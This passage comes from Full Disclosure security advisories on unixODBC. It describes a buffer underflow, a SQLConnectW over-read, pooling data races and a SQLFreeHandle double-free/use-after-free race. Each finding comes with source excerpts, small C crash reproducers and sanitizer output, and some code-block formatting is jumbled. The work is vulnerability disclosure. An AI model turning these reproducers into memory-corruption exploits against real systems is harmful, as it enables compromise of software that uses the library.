     SQLSetEnvAttr(henv, SQL_ATTR_ODBC_VERSION, (void *) SQL_OV_ODBC3, 0);
     SQLAllocHandle(SQL_HANDLE_DBC, henv, &hdbc);

     ret = SQLDriverConnect(hdbc, NULL, connstr, SQL_NTS,
                             outstr, sizeof(outstr), &outstrlen,
                             SQL_DRIVER_NOPROMPT);

     printf("SQLDriverConnect returned %d\n", (int) ret);

     SQLFreeHandle(SQL_HANDLE_DBC, hdbc);
     SQLFreeHandle(SQL_HANDLE_ENV, henv);
     return 0;
}
```
````

Sample code to cause the underflow (note that you should set the \`LTDL\_LIBRARY\_PATH\` to something like \`/tmp:/\`, as mentioned in the write-up above)

````
```text
````

ltdl.c:722:10: runtime error: addition of unsigned offset to 0x604000000110 overflowed to 0x60400000010f

```
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior ltdl.c:722:10 in
```

\==1308271==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60400000010f at pc 0x0000004e4f29 bp 0x7ffdc200ffd0 sp 0x7ffdc200ffc8

```python
READ of size 1 at 0x60400000010f thread T0
     #0 0x4e4f28 in foreach_dirinpath .../libltdl/ltdl.c:722:10
     #1 0x4e2cd4 in find_handle .../libltdl/ltdl.c:809:8
     #2 0x4e2cd4 in try_dlopen .../libltdl/ltdl.c:1469:10
     #3 0x4e15cb in lt_dlopenadvise .../libltdl/ltdl.c:1671:11
     #4 0x4e15cb in lt_dlopen .../libltdl/ltdl.c:1626:10
     #5 0x4dfac2 in main .../ltdl_direct.c:11:9
```

0x60400000010f is located 1 bytes to the left of 38-byte region \[0x604000000110,0x604000000136)

```
allocated by thread T0 here:
     #1 0x4eec2a in lt__malloc .../libltdl/lt__alloc.c:55:16
     #2 0x4e4b98 in foreach_dirinpath .../libltdl/ltdl.c:712:15
```

SUMMARY: AddressSanitizer: heap-buffer-overflow.../libltdl/ltdl.c:722:10 in foreach_dirinpath

````
```
Output from AddressSanitizer

Sample Heap Buffer Over-Reads
````

While more examples exist, we will end with just this one (because this is long enough).

```
Fixed-Length Over-Read in SQLConnectW's Unicode-to-ANSI Conversion
```

The following example is a fixed-length over-read caused when \` SQLConnectW\` converts the caller's Unicode credentials to ANSI by passing the destination buffer's fixed size, rather than the source string's actual length, as the source length to \`unicode\_to\_ansi\_copy\` whenever the caller specifies \`SQL\_NTS\` for either argument's length. This means that, regardless of the length of the caller's string, a fixed-size read is performed against the source buffer. Importantly, the code includes both an overflow and an over-read.

````cpp
```c
     if ( connection && connection -> iconv_cd_uc_to_ascii != (iconv_t)(-1))
     {
         size_t ret;
         size_t inbl = buffer_len * sizeof( SQLWCHAR );
         size_t obl = dest_len;
         char *ipt = (char*)src;
         char *opt = (char*)dest;

         if (( ret = iconv( connection -> iconv_cd_uc_to_ascii,
                     (ICONV_CONST char**)&ipt, &inbl,
                     &opt, &obl )) != (size_t)(-1))
         {
                                 mutex_iconv_exit();

             if ( clen )
             {
                 *clen = opt - dest;
             }
````

/\* Null terminate outside of iconv, so that the length returned does not include the null terminator. \*/

````typescript
if ( obl )
             {
                             *opt = '\0';
             }
             return dest;
         }
     }
```
Code snippet from `unixODBC`'s DriverManager/__info.c, lines 807-832

```c
#include <sql.h>
#include <sqlext.h>
#include <stdio.h>
#include <string.h>

int main(void) {
     SQLHENV henv; SQLHDBC hdbc;
     SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &henv);
     SQLSetEnvAttr(henv, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0);
     SQLAllocHandle(SQL_HANDLE_DBC, henv, &hdbc);

     const char *name = "test"; /* replace with your own DSN name */
     SQLWCHAR dsn[16];
     size_t n = strlen(name);
     for (size_t i = 0; i < n; i++) dsn[i] = (SQLWCHAR)name[i];
     dsn[n] = 0;

     /* A correctly null-terminated, 1-element (empty) UID. */
     SQLWCHAR uid[1] = {0};

     SQLRETURN rc = SQLConnectW(hdbc, dsn, SQL_NTS, uid, SQL_NTS, NULL, 0);
````

printf("rc=%d (a crash is expected before this prints under AddressSanitizer)\\n", rc);

````
return 0;
}
```
Sample code to cause the over-read

```text
==ERROR: AddressSanitizer: stack-buffer-overflow on address ... thread T0
READ of size 66 at ... thread T0
     #0 ... in iconv
     #1 ... in unicode_to_ansi_copy DriverManager/__info.c:812
     #2 ... in SQLConnectW DriverManager/SQLConnectW.c
     #3 ... in main

Address ... is located in stack of thread T0 ...
   This frame has 4 object(s):
     ...
     'uid' (line 22) <== Memory access ... overflows this variable

SUMMARY: AddressSanitizer: stack-buffer-overflow ... in iconv
```
Output from AddressSanitizer
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/

-------- Forwarded Message --------
Subject:        [FD] unixODBC <=2.3.14 Multiple Races
Date:   Wed, 4 Nov 2026 13:14:51 +0000
From:   Daniel Owens via Fulldisclosure <fulldisclosure () seclists org>
Reply-To:       Daniel Owens <dowens () arescorporation com>
To:     fulldisclosure () seclists org <fulldisclosure () seclists org>
````

The unixODBC driver manager library contains multiple races of importance / interest, including a set of data races in the connection-pooling configuration state data that can cause one thread to read a half-written pool-size or timeout value, which can lead to a variety of harmful effects, as well as a race between teardown and error-handling functionality that can result in double-frees and use-after-frees. Other races exist within the code, as well, but, for brevity, are left as exercises for the reader.

```
Examples
Sample Data Races
```

While 7 distinct data races were discovered, the following serves as a blueprint to find both the examples below and other instances.

```
Connection-Pooling Configuration State Data Races
```

The DriverManager's connection-pooling configuration state -- the globals \`pooling\_enabled\`, \`pool\_max\_size\`, and \`pool\_wait\_timeout\` declared in \`SQLConnect.c\` -- is read and written from \`SQLAllocHandle\`, \`SQLSetEnvAttr\`, \`SQLConnect\`, \`SQLDriverConnect\`, \`SQLDisconnect\`, and \`SQLFreeHandle\` without any of the write paths acquiring a lock, despite such a lock -- a mutex in \`\_\_handles.c\` -- already existing expressly for this purpose. Since the variables in question are neither atomic nor \`volatile\`, directly accessing them in such a fashion via reads and writes creates a data race, with the compiler and central processing unit (CPU) being free to tear, cache, and reorder the accesses (and the compiler will, more generally, assume single-threaded execution for non-atomic globals, which may cause aggressive optimisations, like moving reads out of loops, that further break runtime assumptions). While there are multiple sites with this specific problem, we will only show code for one for the sake of brevity. The sample code to reproduce the issue will, across multiple runs, demonstrate races in \`SQLSetEnvAttr\`, \`SQLAllocHandle\`, etc., so running it multiple times will provide a better example thereof, as one would expect with such an issue.

````php
```c
int pooling_enabled = 0;
int pool_max_size = 0;
int pool_wait_timeout;
```
Code snippet from `unixODBC`'s DriverManager/SQLConnect.c, lines 738-740

```c
/** Lines 255-261 **/
/*
* connection pooling stuff
*/

extern int pooling_enabled;
extern int pool_max_size;
extern int pool_wait_timeout;
/** ... **/
/** Lines 302-323 **/
             if ( pooling_string[ 0 ] == '1' ||
                 toupper( pooling_string[ 0 ] ) == 'Y' ||
                 ( toupper( pooling_string[ 0 ] ) == 'O' &&
                     toupper( pooling_string[ 1 ] ) == 'N' ))
             {
                 pooling_enabled = 1;
             }

#ifdef WITH_SHARDENV
             if ( pooling_enabled )
             {
                 int first;

                 SQLGetPrivateProfileString( "ODBC", "PoolMaxSize", "0",
                     pool_max_size_string, sizeof( pool_max_size_string ),
                     "ODBCINST.INI" );
                 pool_max_size = atoi( pool_max_size_string );

                 SQLGetPrivateProfileString( "ODBC", "PoolWaitTimeout", "30",
                     pool_wait_timeout_string, sizeof( pool_wait_timeout_string ),
                     "ODBCINST.INI" );
                 pool_wait_timeout = atoi( pool_wait_timeout_string );
/** .. **/
/** Lines 383-397 **/
#else

             if ( pooling_enabled )
             {
                 int first;

                 SQLGetPrivateProfileString( "ODBC", "PoolMaxSize", "0",
                     pool_max_size_string, sizeof( pool_max_size_string ),
                     "ODBCINST.INI" );
                 pool_max_size = atoi( pool_max_size_string );

                 SQLGetPrivateProfileString( "ODBC", "PoolWaitTimeout", "30",
                     pool_wait_timeout_string, sizeof( pool_wait_timeout_string ),
                     "ODBCINST.INI" );
                 pool_wait_timeout = atoi( pool_wait_timeout_string );
```
Snippets from `unixODBC`'s DriverManager/SQLAllocHandle.c

```c
#include <stdio.h>
#include <pthread.h>
#include <sql.h>
#include <sqlext.h>

#define ITER 2000

static void *setter_thread(void *arg) {
    (void)arg;
    for (int i = 0; i < ITER; i++) {
         SQLSetEnvAttr(SQL_NULL_HENV, SQL_ATTR_CONNECTION_POOLING,
                        (SQLPOINTER)SQL_CP_ONE_PER_DRIVER, 0);
      }
      return NULL;
}

static void *alloc_thread(void *arg) {
     (void)arg;
     for (int i = 0; i < ITER; i++) {
         SQLHENV henv = SQL_NULL_HENV;
         SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &henv);
         if (henv != SQL_NULL_HENV) {
             SQLFreeHandle(SQL_HANDLE_ENV, henv);
         }
     }
     return NULL;
}

int main(void) {
     pthread_t t1, t2;
     pthread_create(&t1, NULL, setter_thread, NULL);
     pthread_create(&t2, NULL, alloc_thread, NULL);
     pthread_join(t1, NULL);
     pthread_join(t2, NULL);
     printf("done\n");
     return 0;
}
```
Sample code to cause the data race

```text
WARNING: ThreadSanitizer: data race (pid=1369482)
   Read of size 4 at 0x7f6f9fff8c28 by thread T2:
     #0 __SQLAllocHandle .../DriverManager/SQLAllocHandle.c:387:18 ...
     #1 SQLAllocHandle .../DriverManager/SQLAllocHandle.c:1396:12 ...
     #2 alloc_thread .../poc_pool_race.c:41:24 ...
   Previous write of size 4 at 0x7f6f9fff8c28 by thread T1:
     #0 SQLSetEnvAttr .../DriverManager/SQLSetEnvAttr.c:156:33 ...
     #1 setter_thread .../poc_pool_race.c:31:9 ...
````

Location is global 'pooling_enabled' of size 4 at 0x7f6f9fff8c28 (libodbc.so.2+0x8ec28)

````
...
SUMMARY: ThreadSanitizer: data race .../SQLAllocHandle.c:387:18 in __SQLAllocHandle
ThreadSanitizer: reported 1 warnings
```
Output from ThreadSanitizer

Sample Double-Free/Use-After-Free Race
````

Although there are multiple instances of this issue within the code base, the following shall serve as a template to find the others.

```
Racing on a Shared Handle
```

The \`\_\_release\_env\`, \`\_\_release\_dbc\`, \`\_\_release\_stmt\`, and \`\_\_release\_desc\` cleanup functions in \`\_\_handles.c\` perform \`memset\` and \`free\` operations to the caller-supplied handle pointer regardless of whether that pointer was actually found and unlinked from the handle list, but handle validation acquires and releases the shared \`mutex\_lists\` lock before the caller proceeds to release the handle such that two threads that call \`SQLFreeHandle\` on the same handle simultaneously can both pass validation, so that both either free the same handle (a double-free) or one frees and the other then reads the freed handle (a use-after-free). Such bugs can, for example, result in a crash or exploitable memory corruption. Please note that our example only shows some of the instances and that the exact same paradigm exists elsewhere in the code. It should also be noted, for completeness, that the code in question and in our sample code snippets contain a variety of other bugs, including the handle being freed inside of the \`mutex\_lists\` lock and then being unlinked from the list after validation has already occurred in a separate lock cycle. Also, \`SQLFreeHandle\` performs validation, drops the lock, and then calls \`\_\_release\_env\` -- it is this process that is allowing the race. Regarding the proof-of-concept (POC), we understand that threads would rarely race to free the base environment handle (\`SQLHENV\`) and that they are more likely to race on connection (\`SQLHDBC\`) and statement (\`SQLHSTMT\`) handles, but we, again, leave that as an exercise for the reader, especially since such adaptations are trivial and the vulnerable code segments are copy/pastes of that which is shown below.

````rust
```c
             thread_release( SQL_HANDLE_ENV, environment );

#ifdef WITH_SHARDENV
             if ( pooling_enabled == 0 ) {
                 /*
                  * release any pooled connections that are using this environment
                  */
                 __strip_from_pool( environment );
             }
#else
             __strip_from_pool( environment );
#endif

             __release_env( environment );

             return SQL_SUCCESS;
         }
         break;
```
Code snippet from `unixODBC`'s DriverManager/SQLFreeHandle.c, lines 271-288

```c
/** Lines 663-686 inside of __validate_env() **/
     local_mutex_entry( &mutex_lists );

     ptr = environment_root;

     while( ptr )
     {
         if ( ptr == env )
         {
             if ( env -> released )
             {
````

fprintf( stderr, "unixODBC: API Error, env handle used after being free\\n" );

````javascript
ret = 0;
             }
             else
             {
                 ret = 1;
             }
             break;
         }

         ptr = ptr -> next_class_list;
     }

     local_mutex_exit( &mutex_lists );
/** ... **/
/** Lines 693-754 inside of __release_env**/
/*
* remove from list
*/

void __release_env( DMHENV environment )
{
     DMHENV last = NULL;
     DMHENV ptr;

     if ( shared_environment && environment == shared_environment ) {
         return;
     }

     local_mutex_entry( &mutex_lists );

     ptr = environment_root;

     while( ptr )
     {
         if ( environment == ptr )
         {
             break;
         }
         last = ptr;
         ptr = ptr -> next_class_list;
     }

     if ( ptr )
     {
         if ( last )
         {
             last -> next_class_list = ptr -> next_class_list;
         }
         else
         {
             environment_root = ptr -> next_class_list;
         }
     }

     clear_error_head( &environment -> error );

                 /*
                 * free log
                 */

     dm_log_close();

#if defined ( COLLECT_STATS ) && defined( HAVE_SYS_SEM_H )
     if (environment->sh)
         uodbc_close_stats(environment->sh);
#endif

     /*
      * clear just to make sure
      */

     memset( environment, 0, sizeof( *environment ));

     free( environment );

     local_mutex_exit( &mutex_lists );
}
```
Snippets from `unixODBC`'s DriverManager/__handles.c

```c
#include <sql.h>
#include <sqlext.h>
#include <pthread.h>
#include <stdio.h>

static SQLHANDLE henv;

static void *racer(void *arg) {
     SQLRETURN ret = SQLFreeHandle(SQL_HANDLE_ENV, henv);
     printf("thread %ld: SQLFreeHandle returned %d\n", (long) arg, (int) ret);
     return NULL;
}

int main(void) {
     for (int iter = 0; iter < 1000; iter++) {
         SQLRETURN ret = SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &henv);
         if (ret != SQL_SUCCESS) {
             fprintf(stderr, "SQLAllocHandle failed (iter %d)\n", iter);
             return 1;
         }

         pthread_t t1, t2;
         pthread_create(&t1, NULL, racer, (void *) 1L);
         pthread_create(&t2, NULL, racer, (void *) 2L);
         pthread_join(t1, NULL);
         pthread_join(t2, NULL);
     }
     return 0;
}
```
Sample code to cause the race

```text
==================================================================
````

\==1368918==ERROR: AddressSanitizer: heap-use-after-free on address 0x61e00001b8b0 at pc 0x7f4de14b2e74 bp 0x7f4ddd3fdcf0 sp 0x7f4ddd3fdce8

````
READ of size 8 at 0x61e00001b8b0 thread T74
     #0 0x7f4de14b2e73 in clear_error_head DriverManager/__info.c:4234:42
     #1 0x7f4de149fe0b in __release_env DriverManager/__handles.c:682:5
     #2 0x7f4de13c8b88 in __SQLFreeHandle DriverManager/SQLFreeHandle.c:286:13
     #3 0x4ded0e in racer repro.c:27:5

freed by thread T73 here:
     #0 0x4a31e6 in free
     #1 0x7f4de149fe30 in __release_env DriverManager/__handles.c:701:5
     #2 0x7f4de13c8b88 in __SQLFreeHandle DriverManager/SQLFreeHandle.c:286:13
     #3 0x4ded0e in racer repro.c:27:5

previously allocated by thread T0 here:
     #0 in __interceptor_calloc
```
Output from AddressSanitizer
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
````
